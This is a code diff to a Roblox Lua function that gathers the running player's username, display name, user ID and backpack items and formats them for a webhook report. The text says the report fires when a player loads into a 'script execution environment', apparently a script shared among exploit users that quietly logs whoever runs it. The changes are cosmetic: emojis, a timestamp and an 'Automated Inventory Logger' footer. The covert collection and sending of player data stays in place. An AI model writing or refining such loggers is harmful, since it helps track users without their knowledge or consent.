@@ -66,7 +66,7 @@ local function sendBackpackToWebhook()
     local items = {}
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            table.insert(items, tool.Name)
+            table.insert(items, "📦 " .. tool.Name)
         end
     end
 
@@ -74,25 +74,31 @@ local function sendBackpackToWebhook()
     if character then
         for _, tool in ipairs(character:GetChildren()) do
             if tool:IsA("Tool") then
-                table.insert(items, tool.Name .. " (equipped)")
+                table.insert(items, "⚔️ " .. tool.Name .. " *(Equipped)*")
             end
         end
     end
 
-    local itemList = #items > 0 and table.concat(items, "\n") or "No items found"
+    local itemList = #items > 0 and table.concat(items, "\n") or "*No items found in inventory.*"
+    
+    -- ISO 8601 Timestamp for the embed footer
+    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
         embeds = {{
-            title = "Player Inventory Report",
-            color = 5814783,
+            title = "🔍 Player Inventory Report",
+            description = "A new player has loaded into the script execution environment.",
+            color = 10181046, -- Sleek Purple Hex color
             fields = {
-                { name = "Username", value = localPlayer.Name, inline = true },
-                { name = "Display Name", value = localPlayer.DisplayName, inline = true },
-                { name = "User ID", value = tostring(localPlayer.UserId), inline = true },
-                { name = "Items in Backpack (" .. #items .. ")", value = itemList }
+                { name = "👤 User Information", value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%s`", localPlayer.Name, localPlayer.DisplayName, tostring(localPlayer.UserId)), inline = false },
+                { name = string.format("🎒 Backpack Contents (%d)", #items), value = itemList, inline = false }
             },
-            footer = { text = "Reported at game load" }
+            footer = { 
+                text = "Automated Inventory Logger",
+                icon_url = "https://i.imgur.com/K6Yw7fE.png" -- Clean bullet icon
+            },
+            timestamp = timestamp
         }}
     })
 
